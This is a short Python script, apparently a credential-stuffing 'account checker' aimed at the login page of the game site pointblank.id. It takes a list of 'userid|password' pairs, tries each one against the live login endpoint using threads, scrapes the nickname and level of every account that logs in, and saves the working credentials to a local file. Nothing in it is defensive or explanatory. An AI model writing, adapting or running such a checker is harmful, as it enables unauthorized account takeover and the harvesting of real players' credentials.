import requests
import os
import sys
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup


login_url = "https://www.pointblank.id/login/process"
repos_url = "https://www.pointblank.id/game/profile"

with requests.session() as s:
    def cek(up):
        try:
            res = s.post(login_url, data={'loginFail': '0', 'userid': up.split('|')[0], 'password': up.split('|')[1]})
            if 'tidak sesuai' in res.text:
                print(up, 'salah')
            else:
                r = s.get(repos_url)
                soup = BeautifulSoup(r.content, "html.parser")
                repos = soup.find("p", class_="level")
                print(up, 'benar')
                usernameDiv = soup.find("div", class_="nick")
                print("Username: " + usernameDiv.getText())
                username = usernameDiv.getText()
                repos = soup.find("p", class_="level")
                print("Level: " + repos.getText())
                reposs = repos.getText()
                if repos is None:
                    print("Akun belum diaktifkan")
                    print(repos)
                    s.close()
                else:
                    with open('mauljancok.txt', 'a+', encoding='utf-8') as f:
                        f.write(up + '|' + reposs + '|' + username + '\n')
                    s.close()
        except:
            pass

try:
    os.system('clear')

    ThreadPool(2).map(cek, open(sys.argv[1], encoding='utf-8').read().splitlines())
    print("Hello, World!")
except requests.exceptions.ConnectionError:
    exit('[!] Check internet')
except IndexError:
    exit('[!] Use: python2 {} target.txt\n[!] Fill in target.txt as follows user-id|password'.format(sys.argv[0]))
except IOError:
    exit('[!] File does not exist')
except KeyboardInterrupt:
    exit('\n[!] Exit')
